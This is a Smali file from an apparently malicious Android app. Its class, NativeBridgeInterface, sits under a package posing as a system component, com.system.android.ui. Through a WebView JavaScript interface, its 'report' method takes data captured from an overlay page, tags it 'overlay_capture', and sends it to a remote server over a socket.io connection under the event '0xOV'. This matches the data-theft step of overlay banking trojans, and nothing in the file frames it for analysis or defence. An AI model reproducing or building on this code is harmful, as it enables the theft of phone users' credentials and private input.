.class public Lcom/system/android/ui/NativeBridgeInterface;
.super Ljava/lang/Object;

.field private context:Landroid/content/Context;

.method public constructor <init>(Landroid/content/Context;)V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    iput-object p1, p0, Lcom/system/android/ui/NativeBridgeInterface;->context:Landroid/content/Context;
    return-void
.end method

.method public report(Ljava/lang/String;)V
    .locals 6
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    :try_start_0
    new-instance v0, Lorg/json/JSONObject;
    invoke-direct {v0, p1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    new-instance v1, Lorg/json/JSONObject;
    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V
    const-string v2, "type"
    const-string v3, "overlay_capture"
    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    const-string v2, "data"
    invoke-virtual {v1, v2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    # Enviar al servidor vía socket
    invoke-static {}, Lcom/system/android/ui/IOSocket;->getInstance()Lcom/system/android/ui/IOSocket;
    move-result-object v0
    invoke-virtual {v0}, Lcom/system/android/ui/IOSocket;->getIoSocket()Lio/socket/client/Socket;
    move-result-object v0

    if-eqz v0, :cond_exit
    const-string v2, "0xOV"
    const/4 v3, 0x1
    new-array v3, v3, [Ljava/lang/Object;
    const/4 v4, 0x0
    aput-object v1, v3, v4
    invoke-virtual {v0, v2, v3}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    :cond_exit
    return-void
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    return-void
    :catch_0
    return-void
.end method
